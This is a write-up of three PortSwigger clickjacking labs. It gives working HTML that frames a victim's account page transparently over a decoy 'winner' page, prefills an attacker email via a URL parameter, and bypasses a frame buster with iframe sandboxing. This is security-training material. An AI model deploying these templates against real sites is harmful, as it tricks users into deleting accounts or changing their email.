# 1. Lab: [Basic clickjacking with CSRF token protection](https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected)

This lab contains login functionality and a **delete account button** _that is protected by a CSRF token_. A user will **click** on elements that display the word _"click"_ on a decoy website.

To solve the lab, craft some HTML that frames the account page and fools the _user into deleting their account_. The lab is solved when the _account is deleted_.

You can log in to your own account using the following credentials: wiener:peter

Note
The victim will be using _Chrome_ so test your exploit on that browser

```html
<html>
	<head>
		<style>
			/* iframe */
			#vulnerable_website {
				position: relative;
				width: 1028px;
				height: 1000;
				top: 0;
				left: 0;
				opacity: 0.5; /*transperant*/
				z-index: 2;
				padding-left: 80px; /*top*/
			}

			#decoy_website {
				position: absolute;
				z-index: 1; /*bottom*/
			}

			#decoy_website button {
				margin-top: -490px;
				margin-left: 130px;
			}
		</style>
	</head>

	<body>
		<div id="decoy_website">
			<img
				src="https://www.freevector.com/uploads/vector/preview/25312/Hammock_Between_Two_Coconut_Trees_On_The_Beach.jpg"
				alt="pic"
			/>
			<h1>You Are The Winner!!!</h1>
			<button>click to win!</button>
		</div>
		<iframe
			id="vulnerable_website"
			src="https://0a9400f303a717ba830b9d72000400e5.web-security-academy.net/my-account"
		>
		</iframe>
	</body>
</html>
```

# 2. [Lab: Clickjacking with form input data prefilled from a URL parameter](https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input)

This lab extends the basic clickjacking example in _Lab: Basic clickjacking with CSRF token protection_. **The goal of the lab is to change the email address of the user** by **prepopulating** a form using a **URL parameter** and enticing the user to inadvertently click on an "Update email" button.
_change_: email=atacker@gmail.com

add:

```javascript
?email=atacker@gmail.com
```

```html
<iframe
	id="vulnerable_website"
	src="https://0ac300a2041d39e2816a7a49006000dd.web-security-academy.net/my-account?email=atacker@gmail.com"
>
</iframe>
```

# 3. [Lab: Clickjacking with a frame buster script](https://portswigger.net/web-security/clickjacking/lab-frame-buster-script)

This lab is protected by a frame buster which prevents the website from being framed. Can you get around the **frame buster** and conduct a **clickjacking attack that changes the users email address**?

To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.

add:

```js
sandbox = 'allow-forms'
```

```html
<iframe
	id="vulnerable_website"
	src="https://0afe00510323657e800b99b2006d0024.web-security-academy.net/my-account?email=atack@gmail.com"
	sandbox="allow-forms"
>
</iframe>
```
